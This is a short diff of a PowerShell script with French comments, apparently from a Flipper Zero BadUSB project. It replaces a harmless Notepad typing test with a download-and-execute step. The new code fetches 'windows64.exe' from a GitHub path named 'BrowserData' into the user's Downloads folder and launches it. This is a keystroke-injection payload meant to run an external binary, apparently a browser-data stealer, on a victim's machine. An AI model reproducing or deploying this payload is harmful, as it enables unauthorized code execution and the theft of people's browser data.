@@ -1,7 +1,11 @@
-Start-Process notepad.exe -Wait
+# Spécifiez l'URL du fichier à télécharger
+$url = "https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/windows64.exe"
 
-Start-Sleep -Seconds 2
+# Spécifiez le chemin de destination pour le téléchargement
+$destination = [System.IO.Path]::Combine($env:UserProfile, 'Downloads')
 
-Add-Type -AssemblyName System.Windows.Forms
-[System.Windows.Forms.SendKeys]::SendWait('salut')
+# Télécharge le fichier depuis l'URL spécifiée
+Invoke-WebRequest -Uri $url -OutFile $destination
 
+# Exécute le fichier téléchargé
+Start-Process -FilePath $destination -Wait
